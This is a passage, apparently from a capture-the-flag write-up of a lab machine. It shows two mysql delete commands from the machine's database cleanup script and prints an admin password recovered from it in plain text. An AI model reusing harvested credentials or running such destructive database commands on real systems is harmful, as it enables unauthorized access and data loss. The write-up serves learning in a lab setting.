mysql book -e "delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';"
mysql book -e "delete from collections where email!='egotisticalSW_was_here@book.htb';"

```

This is what was cleaning up the database when I was working with it earlier. It removes all extra admin@book.htb users except the original one (I can see now the actual password), and it removes all the collections except those from `egotisticalSW_was_here@book.htb`, which are the default four.